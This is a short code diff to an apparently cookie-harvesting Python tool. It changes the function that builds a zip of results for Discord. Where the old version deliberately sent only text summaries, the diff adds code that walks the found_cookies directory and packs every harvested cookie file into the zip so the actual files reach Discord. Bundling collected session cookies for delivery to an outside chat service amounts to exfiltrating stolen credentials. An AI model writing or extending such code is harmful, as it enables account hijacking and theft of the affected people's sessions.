@@ -943,21 +943,32 @@ def _format_duration(seconds: float) -> str:
 
 
 def _create_discord_zip(directory: str) -> Optional[bytes]:
-    """Create a lightweight zip for Discord — summary + matched lines only.
+    """Create a zip of results for Discord.
 
-    The full ``found_cookies/`` directory (which can be hundreds of MB) is
-    intentionally excluded. Only the small text summaries are sent.
+    Includes the scan summary, matched lines, and the actual cookie files
+    (found_cookies/ directory) so the user gets the real files, not just text.
     Returns None if no files to send.
     """
     base = Path(directory)
     buf = io.BytesIO()
     count = 0
     with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
+        # Include summary files
         for name in ("scan_summary.txt", "matched_lines.txt"):
             fpath = base / name
             if fpath.exists():
                 zf.write(fpath, name)
                 count += 1
+
+        # Include all cookie files from found_cookies/
+        cookies_dir = base / "found_cookies"
+        if cookies_dir.exists():
+            for fpath in cookies_dir.rglob("*"):
+                if fpath.is_file():
+                    arcname = str(fpath.relative_to(base))
+                    zf.write(fpath, arcname)
+                    count += 1
+
     if count == 0:
         return None
     data = buf.getvalue()
